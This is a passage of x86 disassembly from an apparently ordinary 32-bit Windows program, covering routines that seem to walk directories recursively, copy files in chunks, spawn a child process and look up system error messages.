  40474f:	5b                   	pop    %ebx
  404750:	5e                   	pop    %esi
  404751:	5f                   	pop    %edi
  404752:	5d                   	pop    %ebp
  404753:	c3                   	ret
  404754:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  40475a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  404760:	56                   	push   %esi
  404761:	53                   	push   %ebx
  404762:	31 f6                	xor    %esi,%esi
  404764:	83 ec 14             	sub    $0x14,%esp
  404767:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40476b:	83 bb 68 40 00 00 01 	cmpl   $0x1,0x4068(%ebx)
  404772:	74 1c                	je     0x404790
  404774:	8d 83 68 20 00 00    	lea    0x2068(%ebx),%eax
  40477a:	89 04 24             	mov    %eax,(%esp)
  40477d:	e8 0e ff ff ff       	call   0x404690
  404782:	85 c0                	test   %eax,%eax
  404784:	74 1a                	je     0x4047a0
  404786:	c7 83 68 40 00 00 01 	movl   $0x1,0x4068(%ebx)
  40478d:	00 00 00 
  404790:	83 c4 14             	add    $0x14,%esp
  404793:	89 f0                	mov    %esi,%eax
  404795:	5b                   	pop    %ebx
  404796:	5e                   	pop    %esi
  404797:	c3                   	ret
  404798:	90                   	nop
  404799:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4047a0:	c7 04 24 e4 d2 40 00 	movl   $0x40d2e4,(%esp)
  4047a7:	be ff ff ff ff       	mov    $0xffffffff,%esi
  4047ac:	e8 5f d6 ff ff       	call   0x401e10
  4047b1:	eb dd                	jmp    0x404790
  4047b3:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4047b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4047c0:	55                   	push   %ebp
  4047c1:	57                   	push   %edi
  4047c2:	b8 5c 12 00 00       	mov    $0x125c,%eax
  4047c7:	56                   	push   %esi
  4047c8:	53                   	push   %ebx
  4047c9:	e8 82 5d 00 00       	call   0x40a550
  4047ce:	29 c4                	sub    %eax,%esp
  4047d0:	8b 84 24 70 12 00 00 	mov    0x1270(%esp),%eax
  4047d7:	8d ac 24 4f 02 00 00 	lea    0x24f(%esp),%ebp
  4047de:	89 2c 24             	mov    %ebp,(%esp)
  4047e1:	89 44 24 04          	mov    %eax,0x4(%esp)
  4047e5:	e8 3e 60 00 00       	call   0x40a828
  4047ea:	89 2c 24             	mov    %ebp,(%esp)
  4047ed:	e8 46 60 00 00       	call   0x40a838
  4047f2:	89 c2                	mov    %eax,%edx
  4047f4:	89 84 24 2c 01 00 00 	mov    %eax,0x12c(%esp)
  4047fb:	0f b6 94 14 4e 02 00 	movzbl 0x24e(%esp,%edx,1),%edx
  404802:	00 
  404803:	80 fa 5c             	cmp    $0x5c,%dl
  404806:	74 09                	je     0x404811
  404808:	80 fa 2f             	cmp    $0x2f,%dl
  40480b:	0f 85 af 00 00 00    	jne    0x4048c0
  404811:	8d 9c 24 34 01 00 00 	lea    0x134(%esp),%ebx
  404818:	ba 2a 00 00 00       	mov    $0x2a,%edx
  40481d:	66 89 54 05 00       	mov    %dx,0x0(%ebp,%eax,1)
  404822:	89 2c 24             	mov    %ebp,(%esp)
  404825:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  404829:	ff 15 cc e2 41 00    	call   *0x41e2cc
  40482f:	83 f8 ff             	cmp    $0xffffffff,%eax
  404832:	89 84 24 28 01 00 00 	mov    %eax,0x128(%esp)
  404839:	74 66                	je     0x4048a1
  40483b:	89 e7                	mov    %esp,%edi
  40483d:	89 de                	mov    %ebx,%esi
  40483f:	b9 46 00 00 00       	mov    $0x46,%ecx
  404844:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404846:	89 e8                	mov    %ebp,%eax
  404848:	8b 94 24 2c 01 00 00 	mov    0x12c(%esp),%edx
  40484f:	e8 9c 00 00 00       	call   0x4048f0
  404854:	eb 23                	jmp    0x404879
  404856:	8d 76 00             	lea    0x0(%esi),%esi
  404859:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404860:	89 e7                	mov    %esp,%edi
  404862:	89 de                	mov    %ebx,%esi
  404864:	b9 46 00 00 00       	mov    $0x46,%ecx
  404869:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40486b:	89 e8                	mov    %ebp,%eax
  40486d:	8b 94 24 2c 01 00 00 	mov    0x12c(%esp),%edx
  404874:	e8 77 00 00 00       	call   0x4048f0
  404879:	8b 84 24 28 01 00 00 	mov    0x128(%esp),%eax
  404880:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  404884:	89 04 24             	mov    %eax,(%esp)
  404887:	ff 15 d4 e2 41 00    	call   *0x41e2d4
  40488d:	85 c0                	test   %eax,%eax
  40488f:	74 cf                	je     0x404860
  404891:	8b 84 24 28 01 00 00 	mov    0x128(%esp),%eax
  404898:	89 04 24             	mov    %eax,(%esp)
  40489b:	ff 15 c8 e2 41 00    	call   *0x41e2c8
  4048a1:	8b 84 24 70 12 00 00 	mov    0x1270(%esp),%eax
  4048a8:	89 04 24             	mov    %eax,(%esp)
  4048ab:	e8 38 60 00 00       	call   0x40a8e8
  4048b0:	81 c4 5c 12 00 00    	add    $0x125c,%esp
  4048b6:	5b                   	pop    %ebx
  4048b7:	5e                   	pop    %esi
  4048b8:	5f                   	pop    %edi
  4048b9:	5d                   	pop    %ebp
  4048ba:	c3                   	ret
  4048bb:	90                   	nop
  4048bc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4048c0:	b9 5c 00 00 00       	mov    $0x5c,%ecx
  4048c5:	66 89 4c 05 00       	mov    %cx,0x0(%ebp,%eax,1)
  4048ca:	83 c0 01             	add    $0x1,%eax
  4048cd:	89 2c 24             	mov    %ebp,(%esp)
  4048d0:	89 84 24 2c 01 00 00 	mov    %eax,0x12c(%esp)
  4048d7:	e8 5c 5f 00 00       	call   0x40a838
  4048dc:	e9 30 ff ff ff       	jmp    0x404811
  4048e1:	eb 0d                	jmp    0x4048f0
  4048e3:	90                   	nop
  4048e4:	90                   	nop
  4048e5:	90                   	nop
  4048e6:	90                   	nop
  4048e7:	90                   	nop
  4048e8:	90                   	nop
  4048e9:	90                   	nop
  4048ea:	90                   	nop
  4048eb:	90                   	nop
  4048ec:	90                   	nop
  4048ed:	90                   	nop
  4048ee:	90                   	nop
  4048ef:	90                   	nop
  4048f0:	55                   	push   %ebp
  4048f1:	57                   	push   %edi
  4048f2:	b9 02 00 00 00       	mov    $0x2,%ecx
  4048f7:	56                   	push   %esi
  4048f8:	53                   	push   %ebx
  4048f9:	bf 18 d3 40 00       	mov    $0x40d318,%edi
  4048fe:	89 c5                	mov    %eax,%ebp
  404900:	83 ec 1c             	sub    $0x1c,%esp
  404903:	8d 5c 24 44          	lea    0x44(%esp),%ebx
  404907:	89 de                	mov    %ebx,%esi
  404909:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  40490b:	0f 97 c1             	seta   %cl
  40490e:	89 ce                	mov    %ecx,%esi
  404910:	0f 92 c1             	setb   %cl
  404913:	89 f0                	mov    %esi,%eax
  404915:	38 c8                	cmp    %cl,%al
  404917:	74 10                	je     0x404929
  404919:	bf 1a d3 40 00       	mov    $0x40d31a,%edi
  40491e:	b9 03 00 00 00       	mov    $0x3,%ecx
  404923:	89 de                	mov    %ebx,%esi
  404925:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  404927:	75 08                	jne    0x404931
  404929:	83 c4 1c             	add    $0x1c,%esp
  40492c:	5b                   	pop    %ebx
  40492d:	5e                   	pop    %esi
  40492e:	5f                   	pop    %edi
  40492f:	5d                   	pop    %ebp
  404930:	c3                   	ret
  404931:	c6 44 15 00 00       	movb   $0x0,0x0(%ebp,%edx,1)
  404936:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40493a:	89 2c 24             	mov    %ebp,(%esp)
  40493d:	e8 ee 5e 00 00       	call   0x40a830
  404942:	f6 44 24 30 10       	testb  $0x10,0x30(%esp)
  404947:	89 2c 24             	mov    %ebp,(%esp)
  40494a:	75 14                	jne    0x404960
  40494c:	e8 7f 5f 00 00       	call   0x40a8d0
  404951:	85 c0                	test   %eax,%eax
  404953:	74 d4                	je     0x404929
  404955:	89 e8                	mov    %ebp,%eax
  404957:	e8 94 fb ff ff       	call   0x4044f0
  40495c:	eb cb                	jmp    0x404929
  40495e:	66 90                	xchg   %ax,%ax
  404960:	e8 5b fe ff ff       	call   0x4047c0
  404965:	eb c2                	jmp    0x404929
  404967:	89 f6                	mov    %esi,%esi
  404969:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404970:	8b 44 24 04          	mov    0x4(%esp),%eax
  404974:	80 b8 68 20 00 00 00 	cmpb   $0x0,0x2068(%eax)
  40497b:	75 03                	jne    0x404980
  40497d:	f3 c3                	repz ret
  40497f:	90                   	nop
  404980:	05 68 20 00 00       	add    $0x2068,%eax
  404985:	89 44 24 04          	mov    %eax,0x4(%esp)
  404989:	e9 32 fe ff ff       	jmp    0x4047c0
  40498e:	66 90                	xchg   %ax,%ax
  404990:	57                   	push   %edi
  404991:	56                   	push   %esi
  404992:	b8 40 20 00 00       	mov    $0x2040,%eax
  404997:	53                   	push   %ebx
  404998:	e8 b3 5b 00 00       	call   0x40a550
  40499d:	29 c4                	sub    %eax,%esp
  40499f:	8b 84 24 50 20 00 00 	mov    0x2050(%esp),%eax
  4049a6:	8d 7c 24 40          	lea    0x40(%esp),%edi
  4049aa:	8d 9c 24 40 10 00 00 	lea    0x1040(%esp),%ebx
  4049b1:	8d 74 24 1c          	lea    0x1c(%esp),%esi
  4049b5:	89 3c 24             	mov    %edi,(%esp)
  4049b8:	89 44 24 04          	mov    %eax,0x4(%esp)
  4049bc:	e8 67 5e 00 00       	call   0x40a828
  4049c1:	8b 84 24 54 20 00 00 	mov    0x2054(%esp),%eax
  4049c8:	89 1c 24             	mov    %ebx,(%esp)
  4049cb:	89 44 24 04          	mov    %eax,0x4(%esp)
  4049cf:	e8 54 5e 00 00       	call   0x40a828
  4049d4:	89 1c 24             	mov    %ebx,(%esp)
  4049d7:	c7 44 24 04 1d d3 40 	movl   $0x40d31d,0x4(%esp)
  4049de:	00 
  4049df:	e8 6c 5e 00 00       	call   0x40a850
  4049e4:	85 c0                	test   %eax,%eax
  4049e6:	89 c3                	mov    %eax,%ebx
  4049e8:	0f 84 82 00 00 00    	je     0x404a70
  4049ee:	66 90                	xchg   %ax,%ax
  4049f0:	89 f9                	mov    %edi,%ecx
  4049f2:	8b 01                	mov    (%ecx),%eax
  4049f4:	83 c1 04             	add    $0x4,%ecx
  4049f7:	8d 90 ff fe fe fe    	lea    -0x1010101(%eax),%edx
  4049fd:	f7 d0                	not    %eax
  4049ff:	21 c2                	and    %eax,%edx
  404a01:	81 e2 80 80 80 80    	and    $0x80808080,%edx
  404a07:	74 e9                	je     0x4049f2
  404a09:	89 d0                	mov    %edx,%eax
  404a0b:	c1 e8 10             	shr    $0x10,%eax
  404a0e:	f7 c2 80 80 00 00    	test   $0x8080,%edx
  404a14:	0f 44 d0             	cmove  %eax,%edx
  404a17:	8d 41 02             	lea    0x2(%ecx),%eax
  404a1a:	0f 44 c8             	cmove  %eax,%ecx
  404a1d:	00 d2                	add    %dl,%dl
  404a1f:	83 d9 03             	sbb    $0x3,%ecx
  404a22:	29 f9                	sub    %edi,%ecx
  404a24:	8d 44 0f 01          	lea    0x1(%edi,%ecx,1),%eax
  404a28:	c6 04 0f 5c          	movb   $0x5c,(%edi,%ecx,1)
  404a2c:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  404a30:	89 04 24             	mov    %eax,(%esp)
  404a33:	e8 f0 5d 00 00       	call   0x40a828
  404a38:	c7 44 24 04 1d d3 40 	movl   $0x40d31d,0x4(%esp)
  404a3f:	00 
  404a40:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404a47:	e8 04 5e 00 00       	call   0x40a850
  404a4c:	85 c0                	test   %eax,%eax
  404a4e:	89 c3                	mov    %eax,%ebx
  404a50:	74 1e                	je     0x404a70
  404a52:	89 74 24 04          	mov    %esi,0x4(%esp)
  404a56:	89 3c 24             	mov    %edi,(%esp)
  404a59:	e8 32 5b 00 00       	call   0x40a590
  404a5e:	85 c0                	test   %eax,%eax
  404a60:	79 8e                	jns    0x4049f0
  404a62:	89 3c 24             	mov    %edi,(%esp)
  404a65:	e8 76 5e 00 00       	call   0x40a8e0
  404a6a:	eb 84                	jmp    0x4049f0
  404a6c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404a70:	89 74 24 04          	mov    %esi,0x4(%esp)
  404a74:	89 3c 24             	mov    %edi,(%esp)
  404a77:	e8 14 5b 00 00       	call   0x40a590
  404a7c:	85 c0                	test   %eax,%eax
  404a7e:	74 20                	je     0x404aa0
  404a80:	89 3c 24             	mov    %edi,(%esp)
  404a83:	c7 44 24 04 51 d3 40 	movl   $0x40d351,0x4(%esp)
  404a8a:	00 
  404a8b:	e8 a0 e3 ff ff       	call   0x402e30
  404a90:	81 c4 40 20 00 00    	add    $0x2040,%esp
  404a96:	5b                   	pop    %ebx
  404a97:	5e                   	pop    %esi
  404a98:	5f                   	pop    %edi
  404a99:	c3                   	ret
  404a9a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404aa0:	89 7c 24 04          	mov    %edi,0x4(%esp)
  404aa4:	c7 04 24 20 d3 40 00 	movl   $0x40d320,(%esp)
  404aab:	e8 60 d3 ff ff       	call   0x401e10
  404ab0:	eb ce                	jmp    0x404a80
  404ab2:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404ab9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404ac0:	57                   	push   %edi
  404ac1:	56                   	push   %esi
  404ac2:	b8 10 10 00 00       	mov    $0x1010,%eax
  404ac7:	53                   	push   %ebx
  404ac8:	e8 83 5a 00 00       	call   0x40a550
  404acd:	29 c4                	sub    %eax,%esp
  404acf:	8b 84 24 20 10 00 00 	mov    0x1020(%esp),%eax
  404ad6:	c7 44 24 04 54 d3 40 	movl   $0x40d354,0x4(%esp)
  404add:	00 
  404ade:	89 04 24             	mov    %eax,(%esp)
  404ae1:	e8 4a e3 ff ff       	call   0x402e30
  404ae6:	89 c3                	mov    %eax,%ebx
  404ae8:	8b 84 24 28 10 00 00 	mov    0x1028(%esp),%eax
  404aef:	89 44 24 04          	mov    %eax,0x4(%esp)
  404af3:	8b 84 24 24 10 00 00 	mov    0x1024(%esp),%eax
  404afa:	89 04 24             	mov    %eax,(%esp)
  404afd:	e8 8e fe ff ff       	call   0x404990
  404b02:	85 c0                	test   %eax,%eax
  404b04:	89 c7                	mov    %eax,%edi
  404b06:	0f 84 b9 00 00 00    	je     0x404bc5
  404b0c:	85 db                	test   %ebx,%ebx
  404b0e:	0f 84 b1 00 00 00    	je     0x404bc5
  404b14:	8d 74 24 10          	lea    0x10(%esp),%esi
  404b18:	90                   	nop
  404b19:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404b20:	89 1c 24             	mov    %ebx,(%esp)
  404b23:	e8 c8 5d 00 00       	call   0x40a8f0
  404b28:	85 c0                	test   %eax,%eax
  404b2a:	0f 85 91 00 00 00    	jne    0x404bc1
  404b30:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  404b34:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  404b3b:	00 
  404b3c:	c7 44 24 04 00 10 00 	movl   $0x1000,0x4(%esp)
  404b43:	00 
  404b44:	89 34 24             	mov    %esi,(%esp)
  404b47:	e8 ac 5c 00 00       	call   0x40a7f8
  404b4c:	83 f8 ff             	cmp    $0xffffffff,%eax
  404b4f:	74 51                	je     0x404ba2
  404b51:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  404b55:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  404b5c:	00 
  404b5d:	c7 44 24 04 00 10 00 	movl   $0x1000,0x4(%esp)
  404b64:	00 
  404b65:	89 34 24             	mov    %esi,(%esp)
  404b68:	e8 a3 5c 00 00       	call   0x40a810
  404b6d:	89 3c 24             	mov    %edi,(%esp)
  404b70:	e8 ab 5c 00 00       	call   0x40a820
  404b75:	85 c0                	test   %eax,%eax
  404b77:	74 a7                	je     0x404b20
  404b79:	89 3c 24             	mov    %edi,(%esp)
  404b7c:	be ff ff ff ff       	mov    $0xffffffff,%esi
  404b81:	e8 72 5d 00 00       	call   0x40a8f8
  404b86:	89 1c 24             	mov    %ebx,(%esp)
  404b89:	e8 72 5c 00 00       	call   0x40a800
  404b8e:	89 3c 24             	mov    %edi,(%esp)
  404b91:	e8 6a 5c 00 00       	call   0x40a800
  404b96:	89 f0                	mov    %esi,%eax
  404b98:	81 c4 10 10 00 00    	add    $0x1010,%esp
  404b9e:	5b                   	pop    %ebx
  404b9f:	5e                   	pop    %esi
  404ba0:	5f                   	pop    %edi
  404ba1:	c3                   	ret
  404ba2:	89 1c 24             	mov    %ebx,(%esp)
  404ba5:	e8 76 5c 00 00       	call   0x40a820
  404baa:	85 c0                	test   %eax,%eax
  404bac:	0f 84 6e ff ff ff    	je     0x404b20
  404bb2:	89 1c 24             	mov    %ebx,(%esp)
  404bb5:	be ff ff ff ff       	mov    $0xffffffff,%esi
  404bba:	e8 39 5d 00 00       	call   0x40a8f8
  404bbf:	eb c5                	jmp    0x404b86
  404bc1:	31 f6                	xor    %esi,%esi
  404bc3:	eb c1                	jmp    0x404b86
  404bc5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404bca:	eb cc                	jmp    0x404b98
  404bcc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404bd0:	56                   	push   %esi
  404bd1:	53                   	push   %ebx
  404bd2:	83 ec 14             	sub    $0x14,%esp
  404bd5:	8b 44 24 20          	mov    0x20(%esp),%eax
  404bd9:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404be0:	00 
  404be1:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404be8:	89 44 24 04          	mov    %eax,0x4(%esp)
  404bec:	e8 cf 05 00 00       	call   0x4051c0
  404bf1:	c7 44 24 08 08 00 00 	movl   $0x8,0x8(%esp)
  404bf8:	00 
  404bf9:	89 c3                	mov    %eax,%ebx
  404bfb:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404c02:	00 
  404c03:	89 04 24             	mov    %eax,(%esp)
  404c06:	ff 15 64 e2 41 00    	call   *0x41e264
  404c0c:	83 ec 0c             	sub    $0xc,%esp
  404c0f:	89 c6                	mov    %eax,%esi
  404c11:	89 1c 24             	mov    %ebx,(%esp)
  404c14:	e8 ef 5b 00 00       	call   0x40a808
  404c19:	83 c4 14             	add    $0x14,%esp
  404c1c:	89 f0                	mov    %esi,%eax
  404c1e:	5b                   	pop    %ebx
  404c1f:	5e                   	pop    %esi
  404c20:	c3                   	ret
  404c21:	eb 0d                	jmp    0x404c30
  404c23:	90                   	nop
  404c24:	90                   	nop
  404c25:	90                   	nop
  404c26:	90                   	nop
  404c27:	90                   	nop
  404c28:	90                   	nop
  404c29:	90                   	nop
  404c2a:	90                   	nop
  404c2b:	90                   	nop
  404c2c:	90                   	nop
  404c2d:	90                   	nop
  404c2e:	90                   	nop
  404c2f:	90                   	nop
  404c30:	31 c0                	xor    %eax,%eax
  404c32:	c3                   	ret
  404c33:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404c39:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404c40:	57                   	push   %edi
  404c41:	56                   	push   %esi
  404c42:	b8 a0 20 00 00       	mov    $0x20a0,%eax
  404c47:	53                   	push   %ebx
  404c48:	e8 03 59 00 00       	call   0x40a550
  404c4d:	29 c4                	sub    %eax,%esp
  404c4f:	8b 84 24 b0 20 00 00 	mov    0x20b0(%esp),%eax
  404c56:	8d b4 24 a0 00 00 00 	lea    0xa0(%esp),%esi
  404c5d:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  404c64:	00 
  404c65:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  404c6c:	00 
  404c6d:	8d 7c 24 5c          	lea    0x5c(%esp),%edi
  404c71:	89 34 24             	mov    %esi,(%esp)
  404c74:	89 44 24 04          	mov    %eax,0x4(%esp)
  404c78:	e8 43 05 00 00       	call   0x4051c0
  404c7d:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  404c84:	00 
  404c85:	c7 04 24 16 00 00 00 	movl   $0x16,(%esp)
  404c8c:	e8 6f 5c 00 00       	call   0x40a900
  404c91:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  404c98:	00 
  404c99:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  404ca0:	e8 5b 5c 00 00       	call   0x40a900
  404ca5:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  404cac:	00 
  404cad:	c7 04 24 0f 00 00 00 	movl   $0xf,(%esp)
  404cb4:	e8 47 5c 00 00       	call   0x40a900
  404cb9:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  404cc0:	00 
  404cc1:	c7 04 24 15 00 00 00 	movl   $0x15,(%esp)
  404cc8:	e8 33 5c 00 00       	call   0x40a900
  404ccd:	c7 44 24 40 0c 00 00 	movl   $0xc,0x40(%esp)
  404cd4:	00 
  404cd5:	c7 44 24 44 00 00 00 	movl   $0x0,0x44(%esp)
  404cdc:	00 
  404cdd:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%esp)
  404ce4:	00 
  404ce5:	89 3c 24             	mov    %edi,(%esp)
  404ce8:	ff 15 48 e2 41 00    	call   *0x41e248
  404cee:	b8 01 00 00 00       	mov    $0x1,%eax
  404cf3:	83 ec 04             	sub    $0x4,%esp
  404cf6:	66 89 84 24 8c 00 00 	mov    %ax,0x8c(%esp)
  404cfd:	00 
  404cfe:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  404d03:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%esp)
  404d0a:	00 
  404d0b:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%esp)
  404d12:	00 
  404d13:	c7 44 24 68 00 00 00 	movl   $0x0,0x68(%esp)
  404d1a:	00 
  404d1b:	c7 84 24 88 00 00 00 	movl   $0x101,0x88(%esp)
  404d22:	01 01 00 00 
  404d26:	89 04 24             	mov    %eax,(%esp)
  404d29:	e8 6a 5b 00 00       	call   0x40a898
  404d2e:	8b 1d e0 e2 41 00    	mov    0x41e2e0,%ebx
  404d34:	89 04 24             	mov    %eax,(%esp)
  404d37:	ff d3                	call   *%ebx
  404d39:	89 84 24 94 00 00 00 	mov    %eax,0x94(%esp)
  404d40:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  404d45:	83 c0 20             	add    $0x20,%eax
  404d48:	89 04 24             	mov    %eax,(%esp)
  404d4b:	e8 48 5b 00 00       	call   0x40a898
  404d50:	89 04 24             	mov    %eax,(%esp)
  404d53:	ff d3                	call   *%ebx
  404d55:	89 84 24 98 00 00 00 	mov    %eax,0x98(%esp)
  404d5c:	a1 e8 e2 41 00       	mov    0x41e2e8,%eax
  404d61:	83 c0 40             	add    $0x40,%eax
  404d64:	89 04 24             	mov    %eax,(%esp)
  404d67:	e8 2c 5b 00 00       	call   0x40a898
  404d6c:	89 04 24             	mov    %eax,(%esp)
  404d6f:	ff d3                	call   *%ebx
  404d71:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%esp)
  404d78:	ff 15 1c e2 41 00    	call   *0x41e21c
  404d7e:	8d 54 24 4c          	lea    0x4c(%esp),%edx
  404d82:	89 7c 24 20          	mov    %edi,0x20(%esp)
  404d86:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  404d8d:	00 
  404d8e:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404d95:	00 
  404d96:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404d9d:	00 
  404d9e:	89 54 24 24          	mov    %edx,0x24(%esp)
  404da2:	8d 54 24 40          	lea    0x40(%esp),%edx
  404da6:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  404dad:	00 
  404dae:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  404db5:	00 
  404db6:	89 44 24 04          	mov    %eax,0x4(%esp)
  404dba:	89 54 24 08          	mov    %edx,0x8(%esp)
  404dbe:	89 34 24             	mov    %esi,(%esp)
  404dc1:	ff 15 08 e2 41 00    	call   *0x41e208
  404dc7:	83 ec 28             	sub    $0x28,%esp
  404dca:	85 c0                	test   %eax,%eax
  404dcc:	75 22                	jne    0x404df0
  404dce:	c7 04 24 58 d3 40 00 	movl   $0x40d358,(%esp)
  404dd5:	e8 36 d0 ff ff       	call   0x401e10
  404dda:	81 c4 a0 20 00 00    	add    $0x20a0,%esp
  404de0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404de5:	5b                   	pop    %ebx
  404de6:	5e                   	pop    %esi
  404de7:	5f                   	pop    %edi
  404de8:	c3                   	ret
  404de9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404df0:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  404df4:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  404dfb:	ff 
  404dfc:	89 04 24             	mov    %eax,(%esp)
  404dff:	ff 15 94 e2 41 00    	call   *0x41e294
  404e05:	83 ec 08             	sub    $0x8,%esp
  404e08:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  404e0c:	89 44 24 04          	mov    %eax,0x4(%esp)
  404e10:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  404e14:	89 04 24             	mov    %eax,(%esp)
  404e17:	ff 15 30 e2 41 00    	call   *0x41e230
  404e1d:	83 ec 08             	sub    $0x8,%esp
  404e20:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  404e24:	81 c4 a0 20 00 00    	add    $0x20a0,%esp
  404e2a:	5b                   	pop    %ebx
  404e2b:	5e                   	pop    %esi
  404e2c:	5f                   	pop    %edi
  404e2d:	c3                   	ret
  404e2e:	90                   	nop
  404e2f:	90                   	nop
  404e30:	83 ec 3c             	sub    $0x3c,%esp
  404e33:	ff 15 34 e2 41 00    	call   *0x41e234
  404e39:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  404e3d:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  404e44:	00 
  404e45:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404e4c:	00 
  404e4d:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404e54:	00 
  404e55:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  404e5c:	00 
  404e5d:	89 54 24 10          	mov    %edx,0x10(%esp)
  404e61:	89 44 24 08          	mov    %eax,0x8(%esp)
  404e65:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404e6c:	00 
  404e6d:	c7 04 24 00 11 00 00 	movl   $0x1100,(%esp)
  404e74:	ff 15 18 e2 41 00    	call   *0x41e218
  404e7a:	83 ec 1c             	sub    $0x1c,%esp
  404e7d:	ba 78 d3 40 00       	mov    $0x40d378,%edx
  404e82:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404e86:	85 c0                	test   %eax,%eax
  404e88:	0f 44 c2             	cmove  %edx,%eax
  404e8b:	83 c4 3c             	add    $0x3c,%esp
  404e8e:	c3                   	ret
  404e8f:	90                   	nop
  404e90:	55                   	push   %ebp
  404e91:	57                   	push   %edi
  404e92:	56                   	push   %esi
  404e93:	53                   	push   %ebx
  404e94:	83 ec 2c             	sub    $0x2c,%esp
  404e97:	8b 3d 98 e2 41 00    	mov    0x41e298,%edi
  404e9d:	8b 74 24 40          	mov    0x40(%esp),%esi
  404ea1:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  404ea8:	00 
  404ea9:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404eb0:	00 
  404eb1:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404eb8:	00 
  404eb9:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  404ec0:	00 
  404ec1:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  404ec8:	ff 
  404ec9:	89 74 24 08          	mov    %esi,0x8(%esp)
  404ecd:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404ed4:	00 
  404ed5:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404edc:	ff d7                	call   *%edi
  404ede:	83 ec 20             	sub    $0x20,%esp
  404ee1:	85 c0                	test   %eax,%eax
  404ee3:	89 c5                	mov    %eax,%ebp
  404ee5:	74 5b                	je     0x404f42
  404ee7:	89 34 24             	mov    %esi,(%esp)
  404eea:	e8 19 5a 00 00       	call   0x40a908
  404eef:	8d 50 01             	lea    0x1(%eax),%edx
  404ef2:	89 14 24             	mov    %edx,(%esp)
  404ef5:	e8 c6 58 00 00       	call   0x40a7c0
  404efa:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  404f01:	00 
  404f02:	89 c3                	mov    %eax,%ebx
  404f04:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404f0b:	00 
  404f0c:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  404f10:	89 44 24 10          	mov    %eax,0x10(%esp)
  404f14:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  404f1b:	ff 
